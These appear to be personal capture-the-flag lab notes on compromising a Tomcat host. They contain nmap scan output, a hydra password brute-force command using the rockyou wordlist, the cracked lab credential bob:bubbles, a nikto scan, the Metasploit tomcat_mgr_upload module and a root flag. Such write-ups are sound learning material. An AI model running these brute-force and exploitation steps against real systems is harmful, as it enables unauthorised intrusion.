## nmap

```sql
└─$ nmap -sC -sV -oN nmap 10.10.55.216
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 15:11 IST
Nmap scan report for 10.10.55.216
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 82:95:bf:c3:85:cb:cc:42:6a:64:a4:e5:d0:20:94:f2 (RSA)
|   256 56:01:70:78:e8:f8:40:ee:cb:57:de:2b:46:90:57:0e (ECDSA)
|_  256 c5:17:5c:ed:40:06:e5:39:92:de:27:64:f5:f8:03:08 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.56 seconds
```


## web

![[Pasted image 20210607151229.png]]

![[Pasted image 20210607151640.png]]

/guidelines

![[Pasted image 20210607151408.png]]


hydra login brute force

`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.55.216 http-get "/protected" `

![[Pasted image 20210607152503.png]]

`bob:bubbles`

![[Pasted image 20210607152706.png]]

`nikto -h http://10.10.55.216:1234/manager/html -id bob:bubbles`

it would take ages and there are 5 docs
![[Pasted image 20210607155712.png]]


## exploit
Apache Tomcat/Coyote JSP engine 1.1 exploit

https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy/

this didnt worked so use `multi/http/tomcat_mgr_upload`
 
 and it worked 
![[Pasted image 20210607154106.png]]

root flag === ff1fc4a81affcc7688cf89ae7dc6e0e1